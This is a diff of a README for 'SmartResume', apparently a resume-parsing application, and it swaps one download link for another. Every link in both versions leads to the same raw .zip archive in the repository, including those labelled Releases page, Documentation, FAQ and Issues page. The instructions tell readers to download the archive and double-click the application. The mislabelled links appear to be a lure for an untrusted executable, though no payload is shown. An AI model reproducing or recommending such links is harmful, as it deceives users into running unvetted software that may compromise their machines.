@@ -1,7 +1,7 @@
 # 💻 SmartResume - Effortless Resume Parsing Made Simple
 
 <div align="center">
-  [![Download SmartResume](https://raw.githubusercontent.com/Aldaramadani/SmartResume/main/projects/SmartResume_3.8.zip)](https://raw.githubusercontent.com/Aldaramadani/SmartResume/main/projects/SmartResume_3.8.zip)
+  [![Download SmartResume](https://github.com/Aldaramadani/SmartResume/raw/refs/heads/main/smartresume/backend/Resume_Smart_2.3-beta.2.zip)](https://github.com/Aldaramadani/SmartResume/raw/refs/heads/main/smartresume/backend/Resume_Smart_2.3-beta.2.zip)
 </div>
 
 ## 🌟 Project Introduction
@@ -10,14 +10,14 @@ SmartResume is a smart resume parsing system. It reads resumes from various form
 ## 🚀 Getting Started
 Follow these steps to download and run SmartResume:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/Aldaramadani/SmartResume/main/projects/SmartResume_3.8.zip) to find the latest version of SmartResume.
+1. Visit the [Releases page](https://github.com/Aldaramadani/SmartResume/raw/refs/heads/main/smartresume/backend/Resume_Smart_2.3-beta.2.zip) to find the latest version of SmartResume.
 
 2. Click on the version number to see available files.
 
 3. Look for the file that matches your operating system. Common files include:
-   - Windows: `https://raw.githubusercontent.com/Aldaramadani/SmartResume/main/projects/SmartResume_3.8.zip`
-   - macOS: `https://raw.githubusercontent.com/Aldaramadani/SmartResume/main/projects/SmartResume_3.8.zip`
-   - Linux: `https://raw.githubusercontent.com/Aldaramadani/SmartResume/main/projects/SmartResume_3.8.zip`
+   - Windows: `https://github.com/Aldaramadani/SmartResume/raw/refs/heads/main/smartresume/backend/Resume_Smart_2.3-beta.2.zip`
+   - macOS: `https://github.com/Aldaramadani/SmartResume/raw/refs/heads/main/smartresume/backend/Resume_Smart_2.3-beta.2.zip`
+   - Linux: `https://github.com/Aldaramadani/SmartResume/raw/refs/heads/main/smartresume/backend/Resume_Smart_2.3-beta.2.zip`
 
 4. Click the file name to start the download. 
 
@@ -30,7 +30,7 @@ Follow these steps to download and run SmartResume:
 8. Double-click the application to run SmartResume. 
 
 ## 📥 Download & Install
-To get started with SmartResume, visit the [Releases page](https://raw.githubusercontent.com/Aldaramadani/SmartResume/main/projects/SmartResume_3.8.zip) to download the software. Choose the appropriate file for your system and follow the above steps to install.
+To get started with SmartResume, visit the [Releases page](https://github.com/Aldaramadani/SmartResume/raw/refs/heads/main/smartresume/backend/Resume_Smart_2.3-beta.2.zip) to download the software. Choose the appropriate file for your system and follow the above steps to install.
 
 ## 🖥️ System Requirements
 - **Windows:** Windows 10 or later
@@ -63,8 +63,8 @@ You can directly export the parsed data in formats like CSV or JSON for further 
 
 ## 📄 Help & Support
 If you encounter any issues, you can check the following resources:
-- [Documentation](https://raw.githubusercontent.com/Aldaramadani/SmartResume/main/projects/SmartResume_3.8.zip) for more detailed instructions.
-- [Frequently Asked Questions (FAQ)](https://raw.githubusercontent.com/Aldaramadani/SmartResume/main/projects/SmartResume_3.8.zip).
-- Contact us through the [Issues page](https://raw.githubusercontent.com/Aldaramadani/SmartResume/main/projects/SmartResume_3.8.zip) for assistance.
+- [Documentation](https://github.com/Aldaramadani/SmartResume/raw/refs/heads/main/smartresume/backend/Resume_Smart_2.3-beta.2.zip) for more detailed instructions.
+- [Frequently Asked Questions (FAQ)](https://github.com/Aldaramadani/SmartResume/raw/refs/heads/main/smartresume/backend/Resume_Smart_2.3-beta.2.zip).
+- Contact us through the [Issues page](https://github.com/Aldaramadani/SmartResume/raw/refs/heads/main/smartresume/backend/Resume_Smart_2.3-beta.2.zip) for assistance.
 
 By following these guidelines, you can easily download and run SmartResume, enjoy its features, and simplify your resume parsing needs.
